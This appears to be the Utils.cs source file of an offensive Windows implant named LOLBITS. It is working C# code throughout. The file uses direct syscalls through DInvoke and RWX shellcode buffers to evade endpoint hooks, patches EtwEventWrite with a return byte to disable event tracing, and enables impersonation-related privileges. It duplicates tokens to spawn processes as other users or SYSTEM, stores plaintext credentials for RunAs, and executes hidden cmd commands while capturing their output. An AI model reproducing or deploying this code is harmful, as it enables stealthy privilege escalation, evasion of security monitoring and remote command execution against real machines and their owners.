using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using LOLBITS.TokenManagement;


namespace LOLBITS
{
    public unsafe class Utils
    {
        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        public const int SECURITY_MANDATORY_UNTRUSTED_RID = (0x00000000);
        public const int SECURITY_MANDATORY_LOW_RID = (0x00001000);
        public const int SECURITY_MANDATORY_MEDIUM_RID = (0x00002000);
        public const int SECURITY_MANDATORY_HIGH_RID = (0x00003000);
        public const int SECURITY_MANDATORY_SYSTEM_RID = (0x00004000);
        public const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = (0x00005000);
        private const int AnySizeArray = 1;

        /////////////////////////// PInvoke ///////////////////////////

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcessAsUserW(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            DInvoke.Win32.Kernel32.CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref DInvoke.Win32.WinNT.StartupInfo lpStartupInfo,
            out DInvoke.Win32.Kernel32.ProcessInformation lpProcessInformation);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
           IntPtr hToken,
           DInvoke.Win32.Kernel32.LogonFlags dwLogonFlags,
           string lpApplicationName,
           string lpCommandLine,
           DInvoke.Win32.Kernel32.CreationFlags dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref DInvoke.Win32.WinNT.StartupInfo lpStartupInfo,
           out DInvoke.Win32.Kernel32.ProcessInformation lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            string userName,
            string domain,
            string password,
            DInvoke.Win32.Kernel32.LogonFlags logonFlags,
            string applicationName,
            string commandLine,
            DInvoke.Win32.Kernel32.CreationFlags creationFlags,
            uint environment,
            string currentDirectory,
            ref DInvoke.Win32.WinNT.StartupInfo startupInfo,
            out DInvoke.Win32.Kernel32.ProcessInformation processInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(
            IntPtr tokenHandle,
            DInvoke.Win32.WinNT._TOKEN_INFORMATION_CLASS tokenInformationClass,
            IntPtr tokenInformation,
            uint tokenInformationLength,
            out uint returnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr GetSidSubAuthority(IntPtr sid, uint subAuthorityIndex);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);

        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);

        /////////////////////////// Native Syscall ///////////////////////////

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtOpenProcess(ref IntPtr hProcess, DInvoke.Win32.Kernel32.ProcessAccessFlags desiredAccess, ref DInvoke.Win32.Kernel32.OBJECT_ATTRIBUTES objectAttributes,
                                          ref DInvoke.Win32.Kernel32.CLIENT_ID clientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtOpenProcessToken(IntPtr processHandle, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS desiredAccess, out IntPtr tokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, out IntPtr buffer, uint numberOfBytesToRead, out IntPtr numberOfBytesReaded);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);


        /////////////////////////// Privileges related functions ///////////////////////////

        public static bool EnablePrivileges(IntPtr handle, List<string> privileges, SysCallManager sysCall)
        {

            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\advapi32.dll");

            foreach (var privilege in privileges)
            {

                try
                {
                    var myLuid = new DInvoke.Win32.WinNT._LUID();
                    object[] lookupPrivileges = { null, privilege, myLuid };
                    var priv = (bool)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LookupPrivilegeValue", 
                                                                              typeof(DInvoke.Win32.DELEGATES.LookupPrivilegeValue), lookupPrivileges);

                    if (!priv) continue;

                    DInvoke.Win32.WinNT._TOKEN_PRIVILEGES myTokenPrivileges;

                    myTokenPrivileges.PrivilegeCount = 1;
                    myTokenPrivileges.Privileges = new DInvoke.Win32.WinNT._LUID_AND_ATTRIBUTES[1];
                    myTokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    myTokenPrivileges.Privileges[0].Luid = myLuid;


                    object[] adjustPrivileges = { handle, false, myTokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero };
                    DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "AdjustTokenPrivileges", 
                                                              typeof(DInvoke.Win32.DELEGATES.AdjustTokenPrivileges), adjustPrivileges);

                }
                catch { return false; }

            }
            return true;

        }

        /////////////////////////// Processes related functions ///////////////////////////

        public static void GetProcessHandle(int pid, out IntPtr handle, DInvoke.Win32.Kernel32.ProcessAccessFlags flags, SysCallManager sysCall)
        {
            handle = IntPtr.Zero;
            var clientId = new DInvoke.Win32.Kernel32.CLIENT_ID() { UniqueProcess = new IntPtr(pid), UniqueThread = IntPtr.Zero};
            var objectAtt = new DInvoke.Win32.Kernel32.OBJECT_ATTRIBUTES(null, 0);
            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");

            var shellCode = sysCall.GetSysCallAsm("NtOpenProcess");

            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
            var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", 
                                                                                    typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);

            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcess));
            var token = IntPtr.Zero;
            var arguments = new object[] { handle, flags, objectAtt, clientId};
            var returnValue = sysCallDelegate.DynamicInvoke(arguments);

            handle = (int)returnValue == 0 ? (IntPtr)arguments[0] : IntPtr.Zero;
        }

        public static void GetProcessToken(IntPtr handle, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS access, out IntPtr currentToken, SysCallManager sysCall)
        {
            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
            var shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");

            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
            var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", 
                                                                                    typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);

            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
            var token = IntPtr.Zero;
            var arguments = new object[] { handle, access, token };
            var returnValue = sysCallDelegate.DynamicInvoke(arguments);


            currentToken = (int)returnValue == 0 ? (IntPtr)arguments[2] : IntPtr.Zero;

        }

        // Code from https://www.pinvoke.net/default.aspx/Constants/SECURITY_MANDATORY.html
        public static bool IsHighIntegrity(SysCallManager sysCall)
        {


            var hToken = IntPtr.Zero;

            GetProcessToken(Process.GetCurrentProcess().Handle, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAllAccess, out hToken,
                    sysCall);

            if (hToken == IntPtr.Zero) return false;

            try
            {
                var pb = Marshal.AllocCoTaskMem(1000);
                try
                {
                    uint cb = 1000;
                    if (GetTokenInformation(hToken, DInvoke.Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb))
                    {
                        var pSid = Marshal.ReadIntPtr(pb);

                        var dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));

                        return dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID;
                    }
                }
                finally
                {
                    Marshal.FreeCoTaskMem(pb);
                }
            }
            finally
            {
                CloseHandle(hToken);
            }

            return false;
        }

        public static int getSystemPID(SysCallManager sysCall)
        {
            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^1:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
            string pid = ExecuteCommand(cmd, sysCall);
            string[] spl = pid.Split('\n');

            return int.Parse(spl[2]);
        }

        public static bool handleETW(SysCallManager sysCall)
        {
            
            var hook = new byte[] { 0xc3 };
            uint oldProtect = 0, x = 0;
            var shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");


            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
            object[] loadLibrary = { "ntdll.dll" };

            IntPtr libraryAddress = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA", 
                                                                                      typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
            object[] procAddress = {libraryAddress, "EtwEventWrite" };

            var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress", 
                                                                            typeof(DInvoke.Win32.DELEGATES.GetProcAddress), procAddress);
            if (address == IntPtr.Zero)
                return false;

            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)hook.Length, (uint)0x40, oldProtect };

            IntPtr hProcess = Process.GetCurrentProcess().Handle;

            IntPtr response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx", 
                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);

            oldProtect = (uint)parameters[4];

            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
            var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", 
                                                                                    typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);

            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));
            var arguments = new object[] { hProcess, address, hook, (UIntPtr)(hook.Length), IntPtr.Zero };
            var returnValue = sysCallDelegate.DynamicInvoke(arguments);
            if ((int)returnValue != 0)
                return false;

            parameters = new object[] { (IntPtr)(-1), address, (UIntPtr)hook.Length, oldProtect, x };
            response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx", 
                                                                         typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);



            return true;
        }

        /////////////////////////// Impersonation ///////////////////////////

        public static void DuplicateToken(IntPtr token, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS tokenAccess, 
                                          DInvoke.Win32.WinNT._SECURITY_IMPERSONATION_LEVEL se, DInvoke.Win32.WinNT.TOKEN_TYPE type, out IntPtr duplicated, SysCallManager sysCall)
        {
            duplicated = IntPtr.Zero;
            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\advapi32.dll");
            object[] duplicateToken = { token, tokenAccess, IntPtr.Zero, se, type, duplicated };

            bool status = (bool)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "DuplicateTokenEx", 
                                                                          typeof(DInvoke.Win32.DELEGATES.DuplicateTokenEx), duplicateToken);


            if (!status) 
                duplicated = IntPtr.Zero;
        }

        public static void DetermineImpersonationMethod(IntPtr token, DInvoke.Win32.Kernel32.LogonFlags l, DInvoke.Win32.WinNT.StartupInfo startupInfo, out DInvoke.Win32.Kernel32.ProcessInformation processInfo)

        {
            if (CreateProcessAsUserW(token, null, @"c:\windows\system32\cmd.exe /Q /C hostname && exit", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                TokenManager._method = 1;
            else 
            if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C hostname && exit", 0,
                IntPtr.Zero, null, ref startupInfo, out processInfo))
                TokenManager._method = 2;
        }

        internal static void RunAs(string domain, string user, string password)
        {
            var startupInfo = new DInvoke.Win32.WinNT.StartupInfo();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.lpDesktop = "";
            startupInfo.wShowWindow = 0;
            startupInfo.dwFlags |= 0x00000001;

            const DInvoke.Win32.Kernel32.LogonFlags logonFlags = new DInvoke.Win32.Kernel32.LogonFlags();

            if (!CreateProcessWithLogonW(user, domain, password, logonFlags, null, @"c:\windows\system32\cmd.exe /Q /C hostname", 0, 0, null, ref startupInfo, out _)) return;

            TokenManager._method = 3;
            TokenManager._credentials[0] = user;
            TokenManager._credentials[1] = domain;
            TokenManager._credentials[2] = password;
        }

        public static void Start()
        {
            var sysCall = new SysCallManager();

            try
            {
                var token = WindowsIdentity.GetCurrent().Token;
                var newToken = IntPtr.Zero;
                var privileges = new List<string>
                {
                    "SeImpersonatePrivilege",
                    "SeTcbPrivilege",
                    "SeAssignPrimaryTokenPrivilege",
                    "SeIncreaseQuotaPrivilege"
                };

                var currentToken = IntPtr.Zero;
                GetProcessToken(Process.GetCurrentProcess().Handle, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAdjustPrivileges, out currentToken,
                    sysCall);

                EnablePrivileges(currentToken, privileges, sysCall);

                CloseHandle(currentToken);

                const DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS tokenAccess =  DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenQuery | DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAssignPrimary |
                                                                             DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenDuplicate | DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAdjustDefault |
                                                                             DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAdjustSessionId;

                DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\advapi32.dll");
                object[] duplicateToken = { token, tokenAccess, IntPtr.Zero, DInvoke.Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, DInvoke.Win32.WinNT.TOKEN_TYPE.TokenPrimary, newToken };

                bool status = (bool)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "DuplicateTokenEx",
                                                                              typeof(DInvoke.Win32.DELEGATES.DuplicateTokenEx), duplicateToken);


                if (!status)
                    return;

                var startupInfo = new DInvoke.Win32.WinNT.StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                const DInvoke.Win32.Kernel32.LogonFlags logonFlags = new DInvoke.Win32.Kernel32.LogonFlags();

                if (CreateProcessAsUserW(newToken, null,
                    @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", IntPtr.Zero,
                    IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out _))
                {
                    TokenManager._token = newToken;
                    TokenManager._method = 1;
                }
                else
                {
                    if (!CreateProcessWithTokenW(newToken, logonFlags, null,
                        @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", 0, IntPtr.Zero,
                        null, ref startupInfo, out _)) return;
                    TokenManager._token = newToken;
                    TokenManager._method = 2;
                }
            }
            catch
            {

            }
        }

        /////////////////////////// Commands execution ///////////////////////////

        public static string ExecuteCommand(string command, SysCallManager sysCall)
        {
            var output = "";
            if (TokenManager._token == IntPtr.Zero && TokenManager._method == 0)
            {
                var process = new Process();
                var startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = @"C:\windows\system32\cmd.exe",
                    Arguments = "/C " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                };

                process.StartInfo = startInfo;
                process.Start();
                output = process.StandardOutput.ReadToEnd();

                if (output == "")
                    output = string.Concat("ERR:", process.StandardError.ReadToEnd());

               
                process.WaitForExit();
                process.Close();
            }
            else
            {
                var outRead = IntPtr.Zero;
                var outWrite = IntPtr.Zero;
                DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");

                var saAttr = new DInvoke.Win32.Kernel32.SecurityAttributes
                {
                    nLength = Marshal.SizeOf(typeof(DInvoke.Win32.Kernel32.SecurityAttributes)),
                    bInheritHandle = true,
                    lpSecurityDescriptor = IntPtr.Zero
                };

                object[] createPipe = { outRead, outWrite, saAttr, 0 };
                var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "CreatePipe", 
                                                                                        typeof(DInvoke.Win32.DELEGATES.CreatePipe), createPipe);

                outRead = (IntPtr)createPipe[0];
                outWrite = (IntPtr)createPipe[1];
                saAttr = (DInvoke.Win32.Kernel32.SecurityAttributes)createPipe[2];

                var startupInfo = new DInvoke.Win32.WinNT.StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.hStdOutput = outWrite;
                startupInfo.hStdError = outWrite;
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000101;

                var l = new DInvoke.Win32.Kernel32.LogonFlags();

                switch (TokenManager._method)
                {
                    case 1:
                        CreateProcessAsUserW(TokenManager._token, null, @"c:\windows\system32\cmd.exe /Q /C" + @command, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out _);
                        break;
                    case 2:
                        CreateProcessWithTokenW(TokenManager._token, l, null, @"c:\windows\system32\cmd.exe /Q /C" + @command, 0, IntPtr.Zero, null, ref startupInfo, out _);
                        break;
                    default:
                        CreateProcessWithLogonW(TokenManager._credentials[0], TokenManager._credentials[1], TokenManager._credentials[2], l, null, @"c:\windows\system32\cmd.exe /Q /C" + command, 0, 0, null, ref startupInfo, out _);
                        break;
                }

                var buf = new byte[100];
                var dwRead = 0;
                Thread.Sleep(500);

                while (true)
                {
                    var bSuccess = ReadFile(outRead, buf, 100, ref dwRead, IntPtr.Zero);
                    output = string.Concat(output, Encoding.Default.GetString(buf));

                    if (!bSuccess || dwRead < 100)
                        break;
                }

                CloseHandle(outRead);
                CloseHandle(outWrite);
            }

            return output;
        }

        
    }
}
